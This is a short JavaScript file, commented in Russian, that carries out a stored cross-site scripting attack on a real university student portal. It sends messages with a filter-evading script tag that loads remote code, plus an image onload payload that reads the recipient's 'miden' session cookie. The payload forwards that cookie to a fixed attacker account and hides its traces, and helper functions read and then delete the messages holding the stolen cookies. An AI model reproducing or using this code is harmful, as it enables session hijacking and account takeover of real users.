function set_Cookie(name, value, expires, path, domain, secure) {
	// Установка cookie
    var curCookie = name + "=" + escape(value) +
        ((expires) ? "; expires=" + expires.toGMTString() : "") +
        ((path) ? "; path=" + path : "") +
        ((domain) ? "; domain=" + domain : "") +
        ((secure) ? "; secure" : "");
        document.cookie = curCookie;
}

function getCookie(name) {
	// Получение cookie
    var prefix = name + "="
    var cookieStartIndex = document.cookie.indexOf(prefix)
    if (cookieStartIndex == -1)
            return null
    var cookieEndIndex = document.cookie.indexOf(";", cookieStartIndex + prefix.length)
    if (cookieEndIndex == -1)
            cookieEndIndex = document.cookie.length
    return unescape(document.cookie.substring(cookieStartIndex + prefix.length, cookieEndIndex))
}

function getMiden(id){
	// Отправляет сообщение с ловушкой получения miden
	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", 'idinfo=0&title=<scrip<scriptt src="https://thealexgo.github.io/forHTML_Academy/js/script.js" async></script>Привет!&mes=<img src=https://pm1.narvii.com/7222/e111e7e7fc0519c97af53ec2f883bf2a358af1c2r1-700-998v2_hq.jpg onload=sendMiden() height=100>&adresat='+id)
}

function sendMiden(){
	// Получает cookie и отправляет miden
	let miden = getCookie('miden')
	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", 'idinfo=0&title=<img src=https://pm1.narvii.com/7222/e111e7e7fc0519c97af53ec2f883bf2a358af1c2r1-700-998v2_hq.jpg height=0 onload=$(this).parent().parent().remove()>&mes='+miden+'&adresat=97130')
}

function delMes(id){
	// Удаляет сообщение по id
	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", "idinfo="+id+"&title=&mes=&adresat=0")
}

function get_n_clear(id){
	// Читает сообщение id и сразу его удаляет
	let a = $.post("https://lk.sut.ru/cabinet/project/cabinet/forms/sendto2.php", data="id="+id+"&prosmotr")
	setTimeout(function() { console.log($(JSON.parse(a.responseText))[0].annotation); delMes(id) }, 1000)
}
